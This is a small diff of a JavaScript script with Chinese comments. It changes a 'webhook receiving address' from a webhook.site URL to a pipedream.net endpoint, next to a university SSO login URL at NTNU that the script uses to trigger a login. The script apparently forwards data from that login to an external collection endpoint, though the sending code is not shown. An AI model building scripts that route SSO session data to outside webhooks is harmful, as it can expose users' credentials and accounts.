@@ -1,7 +1,7 @@
 (async () => {
     // === 設定區域 ===
     // 你的 Webhook 接收地址
-    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
+    const webhook = "https://eokic4rib1w9z4o.m.pipedream.net";
     
     // SSO 入口 (位於 iportal2，用於觸發登入)
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
